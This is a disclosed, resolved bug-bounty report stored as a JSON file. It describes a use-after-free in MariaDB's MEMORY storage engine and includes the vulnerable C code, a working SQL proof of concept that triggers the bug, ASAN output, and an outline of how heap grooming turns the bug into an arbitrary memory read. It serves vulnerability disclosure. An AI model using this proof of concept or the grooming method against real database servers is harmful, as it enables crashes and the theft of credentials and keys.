@@ -1,0 +1,108 @@
+{
+  "id": 3771144,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzcxMTQ0",
+  "url": "https://hackerone.com/reports/3771144",
+  "title": "Use-After-Free in BTREE Index Traversal via Stale key_version in heap_update() in MariaDB Server",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2026-05-30T10:33:58.274Z",
+  "submitted_at": "2026-05-30T10:33:58.449Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lukas_kupczyk",
+    "url": "/lukas_kupczyk",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8724,
+    "url": "https://hackerone.com/mariadb",
+    "handle": "mariadb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MariaDB",
+      "twitter_handle": "mariadb_org",
+      "website": "https://mariadb.org",
+      "about": "MariaDB is a high performance, open source database that helps the world's busiest websites deliver more content, faster."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-09-14T16:05:36.571Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-09-14T16:05:36.295Z",
+  "team_member_agreed_on_going_public_at": "2026-09-07T20:02:38.598Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Description:** \n\nA use-after-free vulnerability exists in MariaDB's MEMORY (HEAP) storage engine. The local variable `key_changed` in `heap_update()` (`storage/heap/hp_update.c`) is declared and initialized to 0 but is never set to 1 anywhere in the function body. This makes the `if (key_changed) share->key_version++` guard dead code. After an UPDATE modifies a column covered by a BTREE index on a MEMORY table, `tree_delete()` frees TREE\\_ELEMENT nodes, but because `key_version` is never incremented, HANDLER cursors still believe their cached parent-path pointers are valid. A subsequent `HANDLER READ idx NEXT` causes `tree_search_next()` to dereference freed TREE\\_ELEMENT pointers — a use-after-free.\n\nWith heap grooming, an attacker reclaims the freed TREE\\_ELEMENT chunks with crafted BTREE nodes from a second MEMORY table whose key bytes encode an arbitrary target address. `tree_search_next()` returns a pointer into the forged node, and `heap_rnext()` then loads the attacker-supplied address as the record pointer and `memcpy`s up to `share->reclength` bytes from that address into the row buffer returned to the client — an arbitrary memory read primitive.\n\nThe bug was introduced in commit 5788294fa365a0f23ee1cd7e12a444cf794ba6bc (2011-01-11) which added HANDLER support for MEMORY tables along with key and file version numbers. Notably, `hp_delete.c` and `hp_write.c` in the same commit correctly increment `share->key_version` unconditionally, but `hp_update.c` omits this increment.\n\nThe vulnerable code in `storage/heap/hp_update.c` lines 20-66:\n\n```c\nint heap_update(HP_INFO *info, const uchar *old, const uchar *heap_new)\n{\n  HP_KEYDEF *keydef, *end, *p_lastinx;\n  uchar *pos, *recovery_ptr;\n  my_bool auto_key_changed= 0, key_changed= 0;  // <-- never set to 1\n  HP_SHARE *share= info->s;\n  // ...\n  for (keydef= share->keydef, end= keydef + share->keys; keydef < end; keydef++)\n  {\n    if (hp_rec_key_cmp(keydef, old, heap_new))\n    {\n      if ((*keydef->delete_key)(info, keydef, old, pos, keydef == p_lastinx) ||\n          (*keydef->write_key)(info, keydef, heap_new, pos))\n        goto err;\n      // NOTE: key_changed = 1; is MISSING HERE\n    }\n  }\n  // ...\n  if (key_changed)        // <-- dead code: key_changed is always 0\n    share->key_version++;  // NEVER EXECUTES\n```\n\nThe stale pointer dereference in `storage/heap/hp_rnext.c` lines 49-97:\n\n```c\n    else if (info->last_pos && info->key_version == info->s->key_version)\n    {\n      pos = tree_search_next(&keyinfo->rb_tree, &info->last_pos,\n                             offsetof(TREE_ELEMENT, left),\n                             offsetof(TREE_ELEMENT, right));  // <-- UAF dereference\n    }\n    // ...\n    if (pos)\n    {\n      memcpy(&pos, pos + (*keyinfo->get_key_length)(keyinfo, pos),\n             sizeof(uchar*));               // <-- attacker-controlled record ptr\n      info->current_ptr = pos;\n    }\n    // ...\n    memcpy(record, pos, (size_t) share->reclength);  // <-- arbitrary read\n```\n\n**Reproduction Steps:** \n\nThe exploit requires only a single connection with standard privileges (SELECT, INSERT, UPDATE, CREATE TABLE). No special configuration is needed; MEMORY tables with BTREE indexes are a standard MariaDB feature.\n\n```sql\n-- Single connection, standard privileges only\nCREATE TABLE poc (\n    k INT,\n    pad VARCHAR(200),\n    INDEX idx USING BTREE (k)\n) ENGINE=MEMORY;\n\nINSERT INTO poc (k, pad) VALUES\n  (10,'a'),(20,'b'),(30,'c'),(40,'d'),(50,'e'),\n  (60,'f'),(70,'g'),(80,'h'),(90,'i'),(100,'j'),\n  (110,'k'),(120,'l'),(130,'m'),(140,'n'),(150,'o'),\n  (160,'p'),(170,'q'),(180,'r'),(190,'s'),(200,'t');\n\nHANDLER poc OPEN;\n\n-- Snapshot key_version, fill parents[] with TREE_ELEMENT* pointers\nHANDLER poc READ idx FIRST;\nHANDLER poc READ idx NEXT;\nHANDLER poc READ idx NEXT;\nHANDLER poc READ idx NEXT;\nHANDLER poc READ idx NEXT;\n\n-- heap_update() frees TREE_ELEMENT nodes but does NOT bump key_version\nUPDATE poc SET k = k + 5000 WHERE k BETWEEN 20 AND 180;\n\n-- tree_search_next() dereferences freed TREE_ELEMENT* pointers (use-after-free)\nHANDLER poc READ idx NEXT;\n```\n\nOn an ASAN build this aborts immediately with a heap-use-after-free report (see below). On a release build the outcome depends on allocator state: the server may crash, return a corrupted row, or appear to continue normally if the freed chunk was reclaimed by a valid node.\n\nAddressSanitizer output (13.0.1-MariaDB-asan, commit `3a2f8e27981b`):\n\n```\n==50410==ERROR: AddressSanitizer: heap-use-after-free on address 0x506000052360 ...\nREAD of size 8 at 0x506000052360 thread T13\n    #0 0x56019d7ad5f5 in tree_search_next mysys/tree.c:501\n    #1 0x56019d06df94 in heap_rnext storage/heap/hp_rnext.c:56\n    #2 0x56019c5aa751 in handler::ha_index_next(unsigned char*) sql/handler.cc:4195\n    #3 0x56019bb1a779 in mysql_ha_read(...) sql/sql_handler.cc:903\n    ...\n\n0x506000052360 is located 32 bytes inside of 64-byte region [0x506000052340,0x506000052380)\nfreed by thread T13 here:\n    #0 0x7f6f782a34d8 in free\n    #1 0x56019d7ac0c7 in tree_delete mysys/tree.c:372\n    #2 0x56019d06478d in hp_rb_delete_key storage/heap/hp_delete.c:81\n    #3 0x56019d06f400 in heap_update storage/heap/hp_update.c:47\n    #4 0x56019d0607ab in ha_heap::update_row(...) storage/heap/ha_heap.cc:313\n    ...\n\npreviously allocated by thread T13 here:\n    #0 0x7f6f782a49c7 in malloc\n    #1 0x56019d797fe7 in my_malloc mysys/my_malloc.c:93\n    #2 0x56019d7ab814 in tree_insert mysys/tree.c:278\n    #3 0x56019d070799 in hp_rb_write_key storage/heap/hp_write.c:121\n    #4 0x56019d06fcdd in heap_write storage/heap/hp_write.c:52\n    ...\n\nSUMMARY: AddressSanitizer: heap-use-after-free mysys/tree.c:501 in tree_search_next\n```\n\n## Impact\n\nAny authenticated user with SELECT, INSERT, UPDATE, and CREATE TABLE privileges on any database can exploit this over a single connection to crash the server. By reclaiming the freed TREE\\_ELEMENT with a crafted BTREE node, the attacker further controls the record pointer dereferenced by `heap_rnext()` and receives bytes from an arbitrary address in the result row. This exposes all process memory (other databases, credentials, TLS keys). Where a starting address is known, whether because the binary was built without PIE, the platform lacks ASLR, or a separate disclosure provides one, the primitive can walk pointer chains across the entire address space, serving as a building block for remote code execution when combined with a write primitive.",
+  "weakness": {
+    "id": 50,
+    "name": "Use After Free"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-10-07T20:02:39.016Z",
+  "allow_singular_disclosure_after": 1996625.819786812,
+  "singular_disclosure_allowed": false,
+  "vote_count": 0,
+  "voters": [],
+  "structured_scope": {
+    "databaseId": 10336,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "MariaDB Server & Connectors - Data corruption, exfiltration, disclosure",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
